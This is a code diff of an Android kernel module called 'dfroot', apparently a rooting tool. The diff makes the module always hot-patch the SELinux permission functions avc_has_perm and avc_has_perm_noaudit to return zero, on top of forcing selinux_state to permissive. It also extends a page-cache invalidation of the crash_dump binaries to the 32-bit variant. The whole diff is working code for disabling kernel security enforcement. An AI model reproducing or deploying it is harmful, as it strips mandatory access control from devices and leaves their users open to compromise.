@@ -94,8 +94,10 @@ static int __nocfi __init dfroot_init(void)
     if (!kern_path_fn || !invalidate_fn || !path_put_fn) {
         pr_err("dfroot: cache drop symbols missing\n");
     } else if (kern_path_fn("/apex/com.android.runtime/bin/crash_dump64",
+                            LOOKUP_FOLLOW, &p) &&
+               kern_path_fn("/apex/com.android.runtime/bin/crash_dump32",
                             LOOKUP_FOLLOW, &p)) {
-        pr_err("dfroot: kern_path failed for crash_dump64\n");
+        pr_err("dfroot: kern_path failed for crash_dump\n");
     } else {
         invalidate_fn(p.dentry->d_inode->i_mapping);
         path_put_fn(&p);
@@ -111,25 +113,23 @@ static int __nocfi __init dfroot_init(void)
     WRITE_ONCE(*selinux_state, false);
     pr_info("dfroot: selinux_state permissive\n");
 
-    // Some kernels ship CONFIG_SECURITY_SELINUX_DEVELOP=n, so the selinux_state
-    // write above is a no-op there — patch the SELinux checks themselves instead
-    // (both: most denials surface through the noaudit path first).
-    if (READ_ONCE(*selinux_state)) {
-        avc_fn = (void *)get_addr("avc_has_perm");
-        if (!avc_fn)
-            pr_err("dfroot: avc_has_perm not found, skipping\n");
-        else {
-            patch_fn_ret_zero(avc_fn);
-            pr_info("dfroot: avc_has_perm patched\n");
-        }
+    // Always patch the SELinux permission checks as well: on kernels where
+    // selinux_state is a struct (5.0+), writing false to byte 0 may hit the
+    // wrong field, leaving enforcing on while the read-back looks clean.
+    avc_fn = (void *)get_addr("avc_has_perm");
+    if (!avc_fn)
+        pr_err("dfroot: avc_has_perm not found, skipping\n");
+    else {
+        patch_fn_ret_zero(avc_fn);
+        pr_info("dfroot: avc_has_perm patched\n");
+    }
 
-        avc_noaudit_fn = (void *)get_addr("avc_has_perm_noaudit");
-        if (!avc_noaudit_fn)
-            pr_err("dfroot: avc_has_perm_noaudit not found, skipping\n");
-        else {
-            patch_fn_ret_zero(avc_noaudit_fn);
-            pr_info("dfroot: avc_has_perm_noaudit patched\n");
-        }
+    avc_noaudit_fn = (void *)get_addr("avc_has_perm_noaudit");
+    if (!avc_noaudit_fn)
+        pr_err("dfroot: avc_has_perm_noaudit not found, skipping\n");
+    else {
+        patch_fn_ret_zero(avc_noaudit_fn);
+        pr_info("dfroot: avc_has_perm_noaudit patched\n");
     }
 
     // Oppo/OnePlus
